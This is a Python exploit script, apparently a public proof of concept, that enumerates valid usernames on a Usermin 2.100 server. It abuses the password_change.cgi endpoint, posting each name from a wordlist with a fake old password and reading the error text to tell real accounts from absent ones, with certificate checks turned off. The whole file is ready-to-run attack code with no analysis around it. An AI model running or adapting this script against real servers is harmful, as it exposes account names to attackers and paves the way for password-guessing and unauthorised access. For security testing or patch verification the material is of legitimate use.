#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Usermin - Username Enumeration (Version 2.100)

import requests
import argparse
import sys
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

parser = argparse.ArgumentParser()

parser.add_argument(
    "-u", "--url",
    help='use -u with the url to the host of usermin, EX: "-u https://127.0.0.1:20000"'
)
parser.add_argument(
    "-w", "--wordlist_users",
    help='use -w with the username wordlist, EX: "-w users.txt"'
)

args = parser.parse_args()

if len(sys.argv) != 5:
    print("Please provide the -u for URL and -w for the wordlist containing the usernames")
    print("EX: python3 UsernameEnum.py -u https://127.0.0.1:20000 -w users.txt")
    sys.exit()

with open(args.wordlist_users, 'r') as usernameFile:
    usernameFileIntoList = usernameFile.read().split("\n")

for i in usernameFileIntoList:
    newHeaders = {
        'Content-type': 'application/x-www-form-urlencoded',
        'Referer': f'{args.url}/password_change.cgi'
    }

    params = {
        'user': i,
        'pam': '',
        'expired': '2',
        'old': 'fakePassword',
        'new1': 'password',
        'new2': 'password'
    }

    response = requests.post(
        f'{args.url}/password_change.cgi',
        data=params,
        verify=False,
        headers=newHeaders
    )

    if "Failed to change password: The current password is incorrect." in response.text:
        print("Possible user found with username: " + i)

    if (
        "Failed to change password: Your login name was not found in the password file!" not in response.text
        and "Failed to change password: The current password is incorrect." not in response.text
    ):
        print("Application is most likely not vulnerable and are therefore quitting.")
        sys.exit()  # comment out this line if you want to continue enumeration
